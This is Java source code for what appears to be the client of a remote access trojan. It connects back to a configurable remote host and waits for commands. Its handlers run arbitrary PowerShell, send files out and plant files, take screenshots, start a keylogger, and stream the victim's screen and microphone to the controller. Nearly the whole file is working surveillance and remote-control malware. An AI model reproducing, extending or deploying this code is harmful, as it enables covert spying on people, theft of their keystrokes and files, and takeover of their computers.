import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

import javax.imageio.ImageIO;
import javax.sound.sampled.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.net.*;
import java.io.*;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;

public class Main {

    final static String endIdentifier = "<end>";
    private static String currentDirectory = System.getProperty("user.dir");
    public static Clip clip = null;
    public static Keylogger keylogger = null;
    public static ScreenShare screenShare = null;
    public static Microphone microphone = null;
    public static String host = "localhost";
    public static int port = 8080;
    public static void main(String[] args) {

        for (String arg : args)
        {
            if(arg.startsWith("host=")){
                host= arg.substring(5,arg.length());
            }
            else if(arg.startsWith("port=")){
                try{
                    port = Integer.parseInt(arg.substring(5,arg.length()));
                }
                catch (Exception e){
                    System.out.println("Failed to convert port to int");
                    System.out.println(e.getMessage());
                }
            }
        }
        while(true) {
            try {
                // create a socket object and connect to the server
                Socket socket = null;
                while (socket == null) {
                    try {
                        socket = new Socket(host, port);
                    } catch (ConnectException e) {
                        // handle the exception as appropriate
                        System.out.println("Connection refused, retrying... host = "+ host+":"+port);
                        Thread.sleep(1000);
                    }
                }
                System.out.println("Connected to server: " + socket);

                // get the input stream from the socket
                InputStream inputStream = socket.getInputStream();
                OutputStream outputStream = socket.getOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());

                while (socket.isConnected()) {
                    System.out.println("Waiting to receieve command");
                    String cmd = receiveData(inputStream);
                    String dataTosend = "";
                    System.out.println("Cmd received : " + cmd);
                    if(cmd.startsWith("cd")){
                        dataTosend =  changeDirectory(cmd.substring(3,cmd.length()));
                    }
                    else if(cmd.equals("dir_gui")){
                        ArrayList<File> filesList = new ArrayList<File>();
                        try{
                            filesList = getFilesInCurrentDirectory();
                        }
                        catch (Exception e){
                            System.out.println(e.getMessage());
                        }
                        objectOutputStream.writeObject(filesList);
                        continue;
                    }
                    else if(cmd.equals("is_connected")){
//                        System.out.println("Got signal to check if connection is alive");
                        dataTosend = "alive";
                    }
                    else if(cmd.startsWith("download")){
                        String filename = cmd.substring(9,cmd.length());
                        byte[] fileBytes = null;
                        try {
                            fileBytes = readFileBytes(filename);
                            System.out.println("File readed");
                            sendFile(fileBytes , outputStream);
                            continue;
                        }
                        catch (Exception e){
                            outputStream.write(("failed"+endIdentifier).getBytes());
                            System.out.println("Failed to read File");
                            System.out.println(e.getMessage());
                            e.printStackTrace();
                            dataTosend = e.getMessage();
                        }
                    }
                    else if(cmd.equals("screenshot")){
                        try {
                            String imgPath = takeScreenShot();
                            System.out.println("Screenshot taken");
                            dataTosend = "<taken>"+imgPath;
                        }
                        catch (Exception e){
                            outputStream.write(("failed"+endIdentifier).getBytes());
                            System.out.println("Failed to to Capture ScreenShot");
                            System.out.println(e.getMessage());
                            dataTosend = e.getMessage();
                        }
                    }
                    else if(cmd.startsWith("<sending_file>")){
                        try {
                            String[] tokenizedString = cmd.split(" ");
                            String filePath = tokenizedString[1];
                            Boolean temp = false;
                            if(tokenizedString.length>2 && tokenizedString[2].equals("<temp>"))
                                temp = true;

                            filePath = receiveAndSaveFile(filePath, inputStream , temp);
                            dataTosend = "ok"+filePath;;
                        }
                        catch (Exception e){
                            System.out.println(e.getMessage());
                            dataTosend = e.getMessage();
                        }
                    }
                    else if(cmd.startsWith("play audio")){
                        String cmdCopy = cmd.trim().replaceAll("(?<=play audio)\\s+(?=\\S)", " ");
                        String[] tokenizedString = cmdCopy.split(" ",3);
                        String filepath = tokenizedString[2];
                        System.out.println("Audio file Path : " +filepath);
                        playAudioFile(filepath , outputStream);
                        continue;
                    }
                    else if(cmd.startsWith("stop audio")){
                        try {
                            stopAudio();
                            dataTosend = "Audio file stopped";
                        }
                        catch (Exception e){
                            dataTosend = "Failed to stop audio file \n"+e.getMessage();
                        }
                    }
                    else if(cmd.startsWith("keylogger start")){
                        String response = startKeylogger();
                        dataTosend = response;
                    }
                    else if(cmd.startsWith("keylogger stop")){
                        String response = stopKeyLogger();
                        dataTosend = stopKeyLogger();
                    }
                    else if(cmd.startsWith("screenshare start")){
                        int port = 8050;
                        try {
                            port = Integer.parseInt(cmd.split(" ")[2]);
                        }
                        catch(Exception e){
                            System.out.println("Port not received or error occured. Setting default port");
                        }
                        screenShare = new ScreenShare(host , port);
                        screenShare.start();
                        dataTosend="Screensharing started";
                    }
                    else if(cmd.startsWith("screenshare stop")){
                        screenShare.stop();
                        dataTosend = "Screenshare stopped successfully";
                    }
                    else if(cmd.startsWith("mic_stream start")) {
                        int port = 8030;
                        try {
                            port = Integer.parseInt(cmd.split(" ")[2]);
                        } catch (Exception e) {
                            System.out.println("Port not received or error occured. Setting default port");
                        }
                        if(microphone != null)
                            microphone.stopStreaming();
                        microphone = new Microphone(host , port);
                        microphone.startStreaming();
                        dataTosend = "Streaming started ...";

                    }
                    else if(cmd.startsWith("mic_stream stop")){
                        microphone.stopStreaming();
                        dataTosend = "Streaming stopped";
                    }
                    else if(cmd.startsWith("show message ")){
                        String[] tokens = cmd.split(" " , 3);
                        if(tokens.length >= 2){
                            showMessageOnScreen(tokens[2]);
                            dataTosend = "Message shown on screeen successfully...";
                        }
                        else {
                            dataTosend = "You must write meesage which you want to show";
                        }
                    }
                    else{
                        dataTosend = execCmd(cmd);
                    }
                    dataTosend += endIdentifier;
                    outputStream.write(dataTosend.getBytes());
                    System.out.println("data sent");
                }
                // close the socket
                socket.close();

            } catch (Exception e) {
                System.out.println("Lost connection to server");
                System.err.println(e.getMessage());
                e.printStackTrace();

            }
        }
    }

    private static String receiveData(InputStream inputStream) throws Exception{
        // read data from the socket input stream
        byte[] buffer = new byte[1024];
        String receivedData = "";
        int bytesRead = 0;
        while (true) {
            bytesRead = inputStream.read(buffer, 0, buffer.length);
            if (bytesRead == -1) {
                break;
            }
            receivedData += new String(buffer, 0, bytesRead);
            if (receivedData.contains(endIdentifier)) {
                break;
            }
        }

        // process the received data
        receivedData = receivedData.trim();
        receivedData = receivedData.substring(0 , receivedData.length() - endIdentifier.length() );
        return receivedData;
    }

    private static String execCmd(String cmd) {
        try {
            ProcessBuilder builder = new ProcessBuilder("powershell.exe", "-Command", cmd);
            builder.redirectErrorStream(true);
            builder.directory(new File(currentDirectory));
            Process process = builder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // wait for the command to finish and check the exit status
            int exitStatus = process.waitFor();
            if (exitStatus != 0) {
                System.err.println("Command exited with status " + exitStatus);
            }
            String outputString = output.toString();
            return outputString;
        } catch (IOException | InterruptedException e) {
            return e.getMessage();
        }

    }

    public static String changeDirectory(String path) {
        if(path.equals(".."))
            return changeToParentDirectory();
        File dir = new File(path);

        if (!dir.isAbsolute()) {
            // Relative path, resolve against current working directory
            dir = new File(currentDirectory, path);
        }

        if (!dir.exists() || !dir.isDirectory()) {
            return "Directory does not exist: " + path;
        }
        currentDirectory = dir.getAbsolutePath();
        return currentDirectory;
    }

    public static String changeToParentDirectory() {
        File currentDir = new File(currentDirectory);
        File parentDir = currentDir.getParentFile();

        if (parentDir == null) {
            return "Already at root directory";
        }
        currentDirectory = parentDir.getAbsolutePath();
        return currentDirectory;
    }
    public static ArrayList<File> getFilesInCurrentDirectory (){
            System.out.println("Getting files in current directory");
            // Get the current directory
            File directory = new File(currentDirectory);

            // Get all files and folders in the directory
            File[] files = directory.listFiles();
            ArrayList<File> fileList = new ArrayList<>();
            for (File file : files) {
                fileList.add(file);
            }
        for (File file : fileList) {
            if (file.isFile()) {
                System.out.println("File: " + file.getName());
            } else if (file.isDirectory()) {
                System.out.println("Folder: " + file.getName());
            }
        }

            return fileList;
    }
    public static byte[] readFileBytes(String filePath) throws Exception{
            File file = new File(getAbsoluteFilePath(filePath));
            byte[] fileBytes = new byte[(int) file.length()];
            FileInputStream fis = new FileInputStream(file);
            fis.read(fileBytes);
            fis.close();

            return fileBytes;
    }
    public static String getAbsoluteFilePath(String filePath){
        Path path = Paths.get(filePath);
        File file;

        if (path.isAbsolute()) {
            file = new File(filePath);
        } else {
            file = new File(currentDirectory, filePath);
        }
        System.out.println("Reading file : "+ file.getAbsolutePath());
        return file.getAbsolutePath();
    }
        public static void sendFile(byte[] fileBytes , OutputStream outputStream) throws IOException{
            outputStream.write(("sending"+endIdentifier).getBytes());
            outputStream.flush();
            System.out.println("Sending file");
            try {
                System.out.println("Sleeping");
                Thread.sleep(500);
            }
            catch (Exception e){
                System.out.println("Failed to sleep for 500ms");
            }
            outputStream.write(fileBytes);
            try {
                Thread.sleep(500);
            }
            catch (Exception e){
                System.out.println("Failed to sleep for 500ms");
            }
            outputStream.write(endIdentifier.getBytes());
            System.out.println("File sent");
        }
    public static String takeScreenShot() throws Exception{
        // Create a new Robot instance
        Robot robot = new Robot();

        // Get the default screen device
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

        // Take a screenshot
        BufferedImage screenshot = robot.createScreenCapture(screenRect);

        // Save the screenshot to a temporary file
        File tempFile = File.createTempFile(getRandomFileName("screenshot_"), ".png");
        ImageIO.write(screenshot, "png", tempFile);

        // Print the file path to the console
        System.out.println("Screenshot saved to: " + tempFile.getAbsolutePath());
        return tempFile.getAbsolutePath();
    }
    public static String getRandomFileName(String prefix ){
        LocalDateTime now = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss");
        return prefix + formatter.format(now) ;
    }
    public static String getFileType(String fileName) {
        int dotIndex = fileName.lastIndexOf('.');
        if (dotIndex == -1) {
            return "";
        }
        return fileName.substring(dotIndex + 1);
    }
    private static String getFileNameWithoutExtension(String fileName) {
        int dotIndex = fileName.lastIndexOf('.');
        if (dotIndex == -1) {
            return fileName;
        }
        return fileName.substring(0, dotIndex);
    }
    public static String receiveAndSaveFile(String filePath , InputStream inputStream , Boolean temp ) throws Exception{
        FileOutputStream fos = null;
        if(temp){
            Path path = Paths.get(filePath);
            String fileName = path.getFileName().toString();
            String fileType = getFileType(fileName);
            System.out.println(fileName);
            System.out.println(fileType);
            File tempFile = File.createTempFile(getFileNameWithoutExtension(fileName) , "."+fileType);
            filePath = tempFile.getAbsolutePath();
            System.out.println(filePath);
            fos = new FileOutputStream(tempFile);
        }
        else {
            filePath = getAbsoluteFilePath(filePath);
            fos = new FileOutputStream(filePath);
        }
        byte[] buffer = new byte[1024];
        int bytesRead;
        System.out.println("Receving file");
//        boolean is_eof_received = false;
        while ((bytesRead = inputStream.read(buffer)) != -1) {
            String receivedData = new String(buffer, 0, bytesRead);
            if(receivedData.endsWith(endIdentifier))
                break;
            fos.write(buffer, 0, bytesRead);
        }
        System.out.println("File saved to current program directory");
//        String outputText = "File saved to " + System.getProperty("user.dir")+"\\"+filename;
        String outputText = "File saved to " +filePath;
        System.out.println(outputText);
        // Close the file
        fos.close();
        return filePath;
    }
    public static void playAudioFile(String filePath , OutputStream outputStream){
        filePath = getAbsoluteFilePath(filePath);
        stopAudio();
        AudioInputStream audioInputStream = null;
        try {
            audioInputStream = AudioSystem.getAudioInputStream(new File(filePath));
            clip = AudioSystem.getClip();
            clip.open(audioInputStream);
            clip.start();
            outputStream.write(("playing audio file : "+filePath+endIdentifier).getBytes());
        }
        catch (UnsupportedAudioFileException | IOException | LineUnavailableException  e) {
            e.printStackTrace();
            try {
                outputStream.write(("Failed to play audio file : " + filePath + "\n" + e.getMessage() + endIdentifier).getBytes());
            }
            catch (Exception err){
                System.out.println(err.getMessage());
            }
        }finally {
            System.out.println("Audio Thread closing");
        }



    }
    public static void stopAudio(){
        if (clip != null && clip.isRunning()) {
            clip.stop();
            clip.close();
        }
    }

    public static String startKeylogger(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Failed to register native hook: " + ex.getMessage());
            return "Failed to register Keylogger\n"+ ex.getMessage();
        }

        keylogger = new Keylogger();
        GlobalScreen.addNativeKeyListener(keylogger);
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            stopKeyLogger();
        }));
        String response = "Keylogger started Successfully. Write \"stop keylogger\" to stop Keylogger."+
                "\nKeylogs are being saved to file : "+ keylogger.tempFile.getAbsolutePath()+
                "\nWrite \"download "+keylogger.tempFile.getAbsolutePath()+"\" anytime to download keylogger file";
        return response;
    }
    public static String stopKeyLogger(){
        System.out.println("Stopping keylogger");
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Failed to unregister native hook: " + ex.getMessage());
            return "Failed to stop keylogger\n"+ ex.getMessage();
        }

        if(keylogger != null){
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter_time = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter_time);
            keylogger.writeBytes("\n\n---------------------------------------------------\nKeylogger stopped at : " + formattedDateTime);
            keylogger = null;
        }

        return "Keylogger stopped successfully!";
    }
    public static void showMessageOnScreen(String message){
        String vbsScript = "MsgBox "+message;

        String scriptFileName = "message.vbs";
        String scriptFilePath = System.getProperty("java.io.tmpdir") + scriptFileName;
        try  {
            FileOutputStream outputStream = new FileOutputStream(scriptFilePath);
                outputStream.write(vbsScript.getBytes());
            System.out.println("VBScript file created successfully at: " + scriptFilePath);
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        // Create the ProcessBuilder
        ProcessBuilder processBuilder = new ProcessBuilder("cscript.exe", "//Nologo", scriptFilePath);
        // Start the process
        try {
            Process process = processBuilder.start();
        }
        catch (Exception e){
            System.out.println("Failed to start message vbs script");
        }
    }


}
